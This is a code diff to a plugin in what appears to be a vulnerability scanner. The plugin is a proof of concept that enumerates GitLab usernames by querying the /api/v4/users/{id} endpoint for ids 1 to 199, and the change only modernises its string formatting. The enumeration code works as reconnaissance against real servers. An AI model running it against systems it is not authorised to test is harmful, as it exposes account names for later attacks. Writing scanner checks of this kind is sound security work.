@@ -6,7 +6,7 @@ from xing.core import PluginType, SchemeType, thread_map
 
 class Plugin(BasePlugin):
     def __init__(self):
-        super(Plugin, self).__init__()
+        super().__init__()
         self.plugin_type = PluginType.POC
         self.vul_name = "Gitlab 用户名泄漏"
         self.app_name = 'Gitlab'
@@ -37,21 +37,21 @@ class Plugin(BasePlugin):
 
         users = self.gen_users()
         if users:
-            self.logger.success("found {} users {} {}".format(target, len(users), users))
+            self.logger.success(f"found {target} users {len(users)} {users}")
         
         # 返回string ，前端显示有点问题。 
         return ",".join(users)
 
     def _get_user(self, uid):
-        url = "{}/api/v4/users/{}".format(self.target, uid)
-        self.logger.debug("req >>> {}".format(url))
+        url = f"{self.target}/api/v4/users/{uid}"
+        self.logger.debug(f"req >>> {url}")
         conn = http_req(url, "get")
         data = conn.json()
         #if data.get("state") == "active":
         return data.get("username")
 
     def gen_users(self):
-        self.logger.info("start get gitlab users >>> {}".format(self.target))
+        self.logger.info(f"start get gitlab users >>> {self.target}")
         items = list(range(1, 200))
         result_map = thread_map(fun=self._get_user, items=items)
         return list(result_map.values())
